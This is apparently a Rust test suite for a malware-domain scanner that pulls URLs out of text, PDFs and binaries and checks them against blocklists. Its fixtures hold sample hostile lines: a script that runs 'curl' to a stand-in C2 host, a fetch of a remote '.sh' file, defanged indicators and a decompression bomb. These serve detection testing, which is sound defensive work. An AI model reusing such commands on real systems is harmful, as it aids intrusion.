use super::extract::*;
use super::*;
use crate::config::Config;
use flate2::write::ZlibEncoder;
use flate2::Compression;
use std::io::Write;

fn doms(bytes: &[u8]) -> Vec<String> {
    let mut v: Vec<String> = extract(bytes).domains.into_keys().collect();
    v.sort();
    v
}

fn tmp(name: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("goop-scan-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn filter(name: &str, list: &str) -> (Filter, std::path::PathBuf) {
    let d = tmp(name);
    std::fs::write(d.join("l.txt"), list).unwrap();
    let cfg: Config = toml::from_str(&format!("[[lists]]\nname='t'\npath='{}'\ncategory='malware'\n", d.join("l.txt").display())).unwrap();
    (Filter::with_paths(&cfg, d.join("c"), d.join("b"), d.join("a")).unwrap(), d)
}

fn zlib(data: &[u8]) -> Vec<u8> {
    let mut e = ZlibEncoder::new(Vec::new(), Compression::default());
    e.write_all(data).unwrap();
    e.finish().unwrap()
}

#[test]
fn plain_text_urls_and_domains() {
    let t = b"See https://Evil.Example.com/path?x=1, and (http://a.test-site.org:8080/x). Mail bob@mail.example.net.\nalso plain.example.io!";
    assert_eq!(doms(t), vec!["a.test-site.org", "evil.example.com", "mail.example.net", "plain.example.io"]);
}

#[test]
fn defanged_and_encoded_indicators_are_recovered() {
    let t = b"hxxps://bad[.]example[.]com/login\nhttp%3A%2F%2Fenc.example.org%2Fx\n<a href=\"http://amp.example.net/?a=1&amp;b=2\">x</a>\nc2 at evil(dot)example(dot)io";
    let d = doms(t);
    for want in ["bad.example.com", "enc.example.org", "amp.example.net", "evil.example.io"] {
        assert!(d.contains(&want.to_string()), "missing {want} in {d:?}");
    }
}

#[test]
fn file_names_versions_and_code_are_not_domains() {
    let t = b"kernel32.dll libc.so.6 install.sh run.py readme.md System.IO.File v1.2.beta 192.168.1.1 config.yaml a.b.c foo.exe notes.txt archive.zip java.lang.String";
    assert_eq!(doms(t), Vec::<String>::new());
}

#[test]
fn ambiguous_extensions_count_only_inside_urls() {
    assert_eq!(doms(b"download http://payload.example.zip/a and run evil.sh now"), vec!["payload.example.zip"]);
}

#[test]
fn paths_do_not_become_domains() {
    assert_eq!(doms(b"/usr/lib/foo.example.com and C:\\temp\\bar.example.org"), Vec::<String>::new());
}

#[test]
fn ip_hosts_are_listed_separately() {
    let ex = extract(b"curl http://203.0.113.7:8080/x.sh and http://[2001:db8::1]/y and http://ok.example.com/");
    assert_eq!(ex.ips.iter().cloned().collect::<Vec<_>>(), vec!["2001:db8::1", "203.0.113.7"]);
    assert!(ex.domains.contains_key("ok.example.com"));
}

#[test]
fn counts_once_per_line_and_keeps_examples() {
    let ex = extract(b"http://a.example.com/1 http://a.example.com/2 a.example.com\nhttp://a.example.com/3\n");
    let info = &ex.domains["a.example.com"];
    assert_eq!(info.count, 2, "two lines mention it");
    assert_eq!(info.examples[0], "http://a.example.com/1");
}

#[test]
fn binary_strings_ascii_and_utf16() {
    let mut b = vec![0u8, 1, 2, 0xff, 0xfe];
    b.extend_from_slice(b"\x00GET http://ascii.example.com/\x00\x01");
    for ch in "http://wide.example.org/c2".encode_utf16() {
        b.extend_from_slice(&ch.to_le_bytes());
    }
    b.extend_from_slice(&[0, 0, 0xde, 0xad]);
    let ex = extract(&b);
    assert_eq!(ex.kind, FileKind::Binary);
    assert!(ex.domains.contains_key("ascii.example.com"));
    assert!(ex.domains.contains_key("wide.example.org"), "{:?}", ex.domains.keys());
}

#[test]
fn kind_detection() {
    assert_eq!(detect(b"%PDF-1.7\n"), FileKind::Pdf);
    assert_eq!(detect(b"<!DOCTYPE html><html><body>x</body></html>"), FileKind::Html);
    assert_eq!(detect(b"just some words\nhttp://x.com"), FileKind::Text);
    assert_eq!(detect(b"MZ\x90\x00\x03\x00\x00\x00\x04"), FileKind::Binary);
    assert_eq!(detect(b""), FileKind::Text);
}

#[test]
fn pdf_compressed_stream_split_text_and_plain_uri() {
    let content = b"BT /F1 12 Tf [(Visit http://hid)-3(den.example.com now)] TJ ET\n(Escaped \\(paren\\) and \\150ttp://oct.example.org/) Tj\n";
    let mut pdf = b"%PDF-1.4\n1 0 obj <</Type/Annot /A <</S/URI /URI (http://link.example.net/x)>>>> endobj\n2 0 obj <</Filter/FlateDecode>>\nstream\n".to_vec();
    pdf.extend(zlib(content));
    pdf.extend_from_slice(b"\nendstream\nendobj\n%%EOF");
    let ex = extract(&pdf);
    assert_eq!(ex.kind, FileKind::Pdf);
    let d: Vec<_> = ex.domains.keys().cloned().collect();
    for want in ["link.example.net", "hidden.example.com", "oct.example.org"] {
        assert!(d.contains(&want.to_string()), "missing {want} in {d:?}");
    }
}

#[test]
fn pdf_text_does_not_double_count() {
    let mut pdf = b"%PDF-1.4\n2 0 obj\nstream\n".to_vec();
    pdf.extend(zlib(b"(http://once.example.com/) Tj\n"));
    pdf.extend_from_slice(b"\nendstream\n");
    assert_eq!(extract(&pdf).domains["once.example.com"].count, 1);
}

#[test]
fn decompression_bomb_is_capped_and_noted() {
    // ~64 MiB of zeros compresses to a few KiB; the cap must stop us inflating all of it.
    let bomb = zlib(&vec![0u8; 64 * 1024 * 1024]);
    assert!(bomb.len() < 200 * 1024);
    let mut pdf = b"%PDF-1.4\n3 0 obj\nstream\n".to_vec();
    pdf.extend(bomb);
    pdf.extend_from_slice(b"\nendstream\n");
    let ex = extract(&pdf);
    assert!(ex.notes.iter().any(|n| n.contains("safety limit")), "{:?}", ex.notes);
}

#[test]
fn garbage_inputs_do_not_panic() {
    for len in [0usize, 1, 2, 3, 5, 100] {
        let _ = extract(&vec![b'%'; len]);
        let _ = extract(&vec![0xffu8; len]);
        let _ = extract(&vec![b'('; len]);
        let _ = extract(&vec![b'&'; len]);
    }
    let _ = extract(b"%PDF-1.4 stream");
    let _ = extract(b"%PDF-1.4 stream\nendstream");
    let _ = extract(b"http://");
    let _ = extract(b"http://[");
    let _ = extract("http://\u{e9}\u{4e2d}.com/\u{ff}%zz%4".as_bytes());
    assert_eq!(percent_decode("%41%4"), "A%4");
    assert_eq!(html_unescape("&#x41;&#66;&bogus;&"), "AB&bogus;&");
}

#[test]
fn verdicts_use_the_same_engine_and_colors() {
    let (f, d) = filter("verdicts", "0.0.0.0 evil.example.com\n");
    f.allow("okay.example.org").unwrap();
    let file = d.join("sample.txt");
    std::fs::write(&file, "x http://sub.evil.example.com/a\nok http://okay.example.org/\nhttp://seen.example.net/ http://new.example.net/").unwrap();
    let seen: HashSet<String> = ["seen.example.net".to_string()].into();
    let r = scan_bytes("sample.txt", &read_file(&file, 1 << 20).unwrap(), &f, &seen);
    let by = |dom: &str| r.findings.iter().find(|x| x.domain == dom).unwrap_or_else(|| panic!("no {dom}"));
    assert_eq!((by("sub.evil.example.com").action, by("sub.evil.example.com").category), (Action::Blocked, Category::Malware));
    assert_eq!(by("sub.evil.example.com").source.as_deref(), Some("t"));
    assert_eq!(by("okay.example.org").category, Category::Allowed);
    assert_eq!(by("seen.example.net").category, Category::Clean);
    assert_eq!(by("new.example.net").category, Category::Unknown);
    assert_eq!(r.findings[0].category, Category::Malware, "worst first");
}

#[test]
fn render_plain_and_colored() {
    let (f, _) = filter("render", "evil.example.com\n");
    let r = scan_bytes("f.txt", b"http://evil.example.com/p http://fine.example.org/", &f, &HashSet::new());
    let plain = render::render(&r, &render::RenderOpts { color: false, flagged_only: false, all: false });
    assert!(!plain.contains('\x1b'));
    for n in ["2 domains found, 1 flagged", "BLOCK", "malware/phishing", "evil.example.com", "http://evil.example.com/p", "Nothing was opened or executed"] {
        assert!(plain.contains(n), "missing {n:?}\n{plain}");
    }
    let colored = render::render(&r, &render::RenderOpts { color: true, flagged_only: false, all: false });
    assert!(colored.contains("\x1b[38;5;9m") && colored.contains("\x1b[38;5;245m"));
    let flagged = render::render(&r, &render::RenderOpts { color: false, flagged_only: true, all: false });
    assert!(!flagged.contains("fine.example.org") && flagged.contains("hidden by --flagged"));
}

#[test]
fn json_output_shape() {
    let (f, _) = filter("json", "evil.example.com\n");
    let r = scan_bytes("f.txt", b"http://evil.example.com/", &f, &HashSet::new());
    let v = serde_json::to_value(&r).unwrap();
    assert_eq!(v["kind"], "text");
    assert_eq!(v["findings"][0]["category"], "malware");
    assert_eq!(v["findings"][0]["action"], "blocked");
}

#[test]
fn read_file_refuses_non_files_and_big_files() {
    let d = tmp("readfile");
    assert!(read_file(&d, 1 << 20).unwrap_err().to_string().contains("not a regular file"));
    assert!(read_file(Path::new("/dev/zero"), 1 << 20).is_err(), "devices must be refused (would never end)");
    let f = d.join("big");
    std::fs::write(&f, vec![b'a'; 4096]).unwrap();
    assert!(read_file(&f, 1024).unwrap_err().to_string().contains("larger than"));
    assert_eq!(read_file(&f, 4096).unwrap().len(), 4096);
    assert!(read_file(&d.join("missing"), 1024).is_err());
}

#[cfg(unix)]
#[test]
fn scanning_never_executes_the_file() {
    use std::os::unix::fs::PermissionsExt;
    let d = tmp("noexec");
    let marker = d.join("PWNED");
    let script = d.join("run.sh");
    std::fs::write(&script, format!("#!/bin/sh\ntouch {}\ncurl http://c2.example.com/x\n", marker.display())).unwrap();
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
    let (f, _) = filter("noexec-f", "c2.example.com\n");
    let r = scan_bytes("run.sh", &read_file(&script, 1 << 20).unwrap(), &f, &HashSet::new());
    assert_eq!(r.findings[0].domain, "c2.example.com");
    assert!(!marker.exists(), "the file must never be executed");
}

#[test]
fn multibyte_text_next_to_entities_does_not_panic() {
    // Regression: lossy-decoded binary data puts U+FFFD (3 bytes) right after '&'.
    let s = "&\u{fffd}\u{fffd}\u{fffd}\u{fffd}x &\u{e9}\u{4e2d} &#\u{fffd}; http://a.example.com/&\u{1f600}\u{1f600}\u{1f600}";
    assert!(extract(s.as_bytes()).domains.contains_key("a.example.com"));
    assert_eq!(html_unescape("&\u{fffd}\u{fffd}\u{fffd}\u{fffd}"), "&\u{fffd}\u{fffd}\u{fffd}\u{fffd}");
}

/// Deterministic fuzz: random mixes of nasty tokens and raw bytes must never panic or hang.
#[test]
fn seeded_fuzz_never_panics() {
    let tokens: &[&[u8]] = &[
        b"&", b"&aaaaaaaaaa", b"&aaaaaaaaaaa", b"&&&&&&&&&&&", b"%", b"%4", b"%zz", b"&#", b"&#x", b";", b"http://", b"https://", b"[.]", b"(dot)", b"hxxp", b"://", b"@", b"[", b"]", b"(", b")", b"\\",
        b"\\1", b"\n", b"\0", b"stream\n", b"endstream", b"%PDF-1.4", b"/URI (", b"a.com", b"-", b"..", b".", b"xn--", "\u{fffd}".as_bytes(), "\u{1f600}".as_bytes(),
        "\u{4e2d}\u{6587}".as_bytes(), b"\xff\xfe", b"\x00a\x00b\x00c\x00d", b"http://[", b"http://[::1", b":99999", b"/", b"?", b"#",
    ];
    let mut x: u64 = 0x9E3779B97F4A7C15;
    let mut next = move || {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        x
    };
    for _ in 0..4000 {
        let mut buf = Vec::new();
        for _ in 0..(next() % 40) {
            if next() % 4 == 0 {
                buf.push((next() & 0xff) as u8);
            } else {
                buf.extend_from_slice(tokens[(next() as usize) % tokens.len()]);
            }
        }
        let _ = extract(&buf);
        // Same payload as the content of a compressed PDF stream: this reaches pdf_text(), the only
        // place arbitrary bytes are decoded lossily (where U+FFFD can appear).
        let mut pdf = b"%PDF-1.4\n1 0 obj\nstream\n".to_vec();
        pdf.extend(zlib(&[b"(".as_slice(), &buf, b") Tj\n"].concat()));
        pdf.extend_from_slice(b"\nendstream\n");
        let _ = extract(&pdf);
    }
}

#[test]
fn pdf_literal_with_invalid_utf8_next_to_ampersand() {
    // Regression for a panic found scanning a real Chromium-made PDF.
    let mut content = b"(&aaaaaaaaaa".to_vec();
    content.extend_from_slice(&[0xe4, 0xb8, 0x80, 0xff, 0xfe, 0xe4]);
    content.extend_from_slice(b" http://pdf-utf8.example.com/) Tj\n");
    let mut pdf = b"%PDF-1.4\n1 0 obj\nstream\n".to_vec();
    pdf.extend(zlib(&content));
    pdf.extend_from_slice(b"\nendstream\n");
    assert!(extract(&pdf).domains.contains_key("pdf-utf8.example.com"));
}

/// Built from the real structure of a Chromium-made PDF: hex glyph IDs + a ToUnicode CMap per font.
#[test]
fn pdf_hex_glyph_text_is_decoded_through_tounicode() {
    // "Invoice 4471" in font F4 (real CMap from the file), then text in a different font F5.
    let cmap4 = b"/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap\n1 begincodespacerange\n<0000> <FFFF>\nendcodespacerange\n9 beginbfchar\n<0003> <0020>\n<0014> <0031>\n<0017> <0034>\n<001A> <0037>\n<002C> <0049>\n<0046> <0063>\n<0048> <0065>\n<004C> <0069>\n<0059> <0076>\nendbfchar\n1 beginbfrange\n<0051> <0052> <006E>\nendbfrange\nendcmap\nend\nend\n";
    // font F5: maps glyph ids to the letters of "http://hex.example.org/"
    let text = "http://hex.example.org/";
    let mut cmap5 = String::from("begincmap\n1 begincodespacerange\n<0000> <FFFF>\nendcodespacerange\n");
    let uniq: Vec<char> = { let mut u: Vec<char> = text.chars().collect(); u.sort(); u.dedup(); u };
    cmap5.push_str(&format!("{} beginbfchar\n", uniq.len()));
    for (i, ch) in uniq.iter().enumerate() {
        cmap5.push_str(&format!("<{:04X}> <{:04X}>\n", i + 0x20, *ch as u32));
    }
    cmap5.push_str("endbfchar\nendcmap\n");
    let glyphs: String = text.chars().map(|c| format!("{:04X}", uniq.iter().position(|u| *u == c).unwrap() + 0x20)).collect();
    let content = format!(
        "BT\n/F4 32 Tf\n1 0 0 -1 8 37 Tm\n<002C005100590052004C00460048000300170017001A0014> Tj\nET\nBT\n/F5 16 Tf\n<{}> Tj\nET\n",
        glyphs
    );
    let mut pdf = b"%PDF-1.4\n".to_vec();
    for body in [content.as_bytes(), cmap4.as_slice(), cmap5.as_bytes()] {
        pdf.extend_from_slice(b"1 0 obj\nstream\n");
        pdf.extend(zlib(body));
        pdf.extend_from_slice(b"\nendstream\nendobj\n");
    }
    let ex = extract(&pdf);
    assert_eq!(ex.kind, FileKind::Pdf);
    let d: Vec<_> = ex.domains.keys().cloned().collect();
    assert!(d.contains(&"hex.example.org".to_string()), "decoded domains: {d:?}");
    assert_eq!(d.len(), 1, "wrong-font CMaps must not invent domains: {d:?}");
    assert!(!ex.notes.iter().any(|n| n.contains("best-effort")), "text was found, so no caveat needed");
}

#[test]
fn cmap_parsing_ranges_and_bounds() {
    let c = parse_cmap(b"begincmap\n2 beginbfrange\n<0010> <0012> <002D>\n<0046> <0048> <0063>\nendbfrange\n1 beginbfchar\n<0003> <0020>\nendbfchar\n").unwrap();
    let get = |k: u32| c.map.get(&k).map(String::as_str);
    assert_eq!((get(0x10), get(0x12), get(0x46), get(0x48), get(3)), (Some("-"), Some("/"), Some("c"), Some("e"), Some(" ")));
    assert!(parse_cmap(b"not a cmap").is_none());
    assert!(parse_cmap(b"beginbfrange <0000> <FFFFFFFF> <0041> endbfrange").is_none(), "huge ranges are ignored");
    // decoding rejects a block that mostly doesn't map
    assert!(decode_block(&c, &[vec![0x00, 0x99, 0x00, 0x98, 0x00, 0x97]]).is_none());
    assert_eq!(decode_block(&c, &[vec![0x00, 0x46, 0x00, 0x48]]).as_deref(), Some("ce"));
}

#[test]
fn hex_blocks_ignore_dicts_and_literals() {
    let b = hex_text_blocks(b"<</Type /X /K <0102>>> (a <ff> b) BT <4142> Tj <43> Tj ET BT <44> Tj ET");
    assert_eq!(b, vec![vec![vec![0x41, 0x42], vec![0x43]], vec![vec![0x44]]]);
}

#[test]
fn binary_streams_inside_pdf_only_yield_explicit_urls() {
    // A font-program-like stream: mostly binary, with a stray "2.cv" and one real URL in it.
    let mut blob: Vec<u8> = (0..400u32).map(|i| (i.wrapping_mul(37) % 200 + 1) as u8 | 0x80).collect();
    blob.extend_from_slice(b"\x00cvt 2.cv \x00 http://in-font.example.com/x \x01");
    let mut pdf = b"%PDF-1.4\n1 0 obj\nstream\n".to_vec();
    pdf.extend(zlib(&blob));
    pdf.extend_from_slice(b"\nendstream\n");
    assert_eq!(doms(&pdf), vec!["in-font.example.com"]);
}

#[test]
fn pdf_simple_font_hex_text_and_no_junk_from_glyph_ids() {
    // 1-byte font: hex is the ASCII text itself.
    let simple = "BT /F1 12 Tf <687474703A2F2F73696D706C652E6578616D706C652E6F72672F> Tj ET\n";
    let mut pdf = b"%PDF-1.4\n1 0 obj\nstream\n".to_vec();
    pdf.extend(zlib(simple.as_bytes()));
    pdf.extend_from_slice(b"\nendstream\n");
    assert_eq!(doms(&pdf), vec!["simple.example.org"]);
    // 2-byte glyph IDs that happen to spell ASCII when their bytes are concatenated must not yield text
    let cid = "BT /F1 12 Tf <00320 02E00630076> Tj ET\n";
    let mut pdf = b"%PDF-1.4\n1 0 obj\nstream\n".to_vec();
    pdf.extend(zlib(cid.as_bytes()));
    pdf.extend_from_slice(b"\nendstream\n");
    assert!(!doms(&pdf).contains(&"2.cv".to_string()), "{:?}", doms(&pdf));
}
